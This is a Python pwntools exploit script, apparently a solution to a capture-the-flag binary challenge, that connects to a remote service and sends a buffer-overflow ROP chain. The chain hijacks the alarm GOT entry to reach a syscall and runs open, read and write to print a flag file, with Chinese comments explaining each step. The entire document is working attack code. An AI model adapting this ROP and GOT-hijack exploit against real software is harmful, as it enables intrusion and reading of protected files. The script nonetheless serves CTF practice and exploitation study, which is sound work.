from pwn import *

context(os='linux', arch='amd64', log_level='debug')

# p = process('../file/773a2d87b17749b595ffb937b4d29936')
p = remote('61.147.171.105', '58333')
elf = ELF('../file/773a2d87b17749b595ffb937b4d29936')

input('continue?')

pop_rdi_ret = 0x4008a3
pop_rdx_ret = 0x4006fe
pop_rax_ret = 0x4006fc
pop_rsi_r15_ret = 0x4008a1
add_al_rdi_ret = 0x40070d
flag_addr = elf.symbols['flag'] 

bss = elf.bss()
read_plt = elf.plt['read']
write_plt = elf.plt['write']
alarm_got = elf.got['alarm']
alarm_plt = elf.plt['alarm']

payload = flat(
    b'a' * 0x38,
    # alarm GOT表劫持到syscall位置
    pop_rax_ret,
    5, # alarm + 5 = syscall
    pop_rdi_ret,
    alarm_got,
    add_al_rdi_ret,
    # fd = open('flag', READONLY)
    pop_rdi_ret,
    flag_addr,
    pop_rsi_r15_ret,
    0,
    0,
    pop_rdx_ret,
    0,
    pop_rax_ret,
    2, # open的调用号为2
    # 执行syscall，传参顺序是rdi，rsi，rdx，r10，r9，r8
    alarm_plt,
    # 将fd写入bss段，read(fd, bss, 0x2d)
    pop_rdi_ret,
    3, # 文件描述符设置为3，如果失败可以递增找出正确的值
    pop_rdx_ret,
    0x2d,
    pop_rsi_r15_ret,
    bss,
    0,
    read_plt,
    # 输出flag，write(1, bss, 0x40)
    pop_rsi_r15_ret,
    bss,
    0,
    pop_rdx_ret,
    0x40,
    pop_rdi_ret,
    1,
    write_plt,
)

print(len(payload))

p.sendline(b'310')
p.sendline(payload)

p.shutdown('send')
p.interactive()